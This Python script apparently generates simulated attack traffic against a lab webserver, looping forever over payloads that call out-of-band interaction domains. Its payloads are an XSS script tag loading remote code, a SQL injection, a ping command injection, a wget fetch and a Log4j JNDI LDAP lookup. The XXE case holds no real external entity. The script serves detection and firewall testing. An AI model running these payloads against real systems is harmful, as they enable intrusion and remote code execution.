import random
import requests

# Define the target webserver where all requests will be sent
target_webserver = 'https://www.fastlylab.com'

# List of out-of-band domains to be used in the attack simulation payloads
oob_domains = [
    "interact.sh", "oast.fun", "interactsh.com", "oast.site", "oast.me",
    "oast.live", "oast.online", "oast.pro", "nessus.org", "r87.me",
    "xss.ht", "bxss.me", "bxss.in", "oastify.com", "ptst.io",
    "xss.report", "canarytokens.com"
]

# Define common types of attacks
attack_types = ['HTTP', 'XSS', 'SQLi', 'XXE', 'Command Injection', 'RCE', 'Log4j']

# Specify a fixed IP address for the X-Source-Ip header
source_ip = '203.50.7.33'

def send_request(method, url, data=None):
    """Generic function to send HTTP requests to handle different methods, including a custom header."""
    headers = {'X-Source-Ip': source_ip}
    
    try:
        if method == 'GET':
            response = requests.get(url, headers=headers)
        elif method == 'POST':
            response = requests.post(url, data=data, headers=headers)
        print(f"{method} request sent to {url}. Response Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending {method} request to {url}: {e}")

def simulate_http(oob_domain):
    payload_url = f"{target_webserver}/malicious?payload=http://{oob_domain}"
    send_request('GET', payload_url)

def simulate_xss(oob_domain):
    payload_url = f"{target_webserver}/vulnerable_page?user_input=<script src='http://{oob_domain}'></script>"
    send_request('GET', payload_url)

def simulate_sqli(oob_domain):
    payload_url = f"{target_webserver}/db_query?query=SELECT * FROM users WHERE username='admin' -- AND password='http://{oob_domain}'"
    send_request('GET', payload_url)

def simulate_xxe(oob_domain):
    xml_payload = f'<?xml version="1.0" encoding="UTF-8"?><doc><entity>{oob_domain}</entity></doc>'
    payload_url = f"{target_webserver}/xml_processor"
    send_request('POST', payload_url, data=xml_payload)

def simulate_command_injection(oob_domain):
    payload_url = f"{target_webserver}/cmd_exec?cmd=ping%20-c%201%20{oob_domain}"
    send_request('GET', payload_url)

def simulate_rce(oob_domain):
    payload_url = f"{target_webserver}/app?input=wget%20http://{oob_domain}"
    send_request('GET', payload_url)

def simulate_log4j(oob_domain):
    malicious_payload = '${jndi:ldap://' + oob_domain + '/a}'
    payload_url = f"{target_webserver}/log_input?data={malicious_payload}"
    send_request('GET', payload_url)

def simulate_attack():
    selected_oob_domain = random.choice(oob_domains)
    selected_attack_type = random.choice(attack_types)
    
    print(f"Attempting to simulate {selected_attack_type} with OOB domain {selected_oob_domain}")
    attack_function = {
        'HTTP': simulate_http,
        'XSS': simulate_xss,
        'SQLi': simulate_sqli,
        'XXE': simulate_xxe,
        'Command Injection': simulate_command_injection,
        'RCE': simulate_rce,
        'Log4j': simulate_log4j
    }.get(selected_attack_type, lambda x: print("Unknown attack type"))
    
    if attack_function:
        attack_function(selected_oob_domain)

if __name__ == "__main__":
    while True:
        simulate_attack()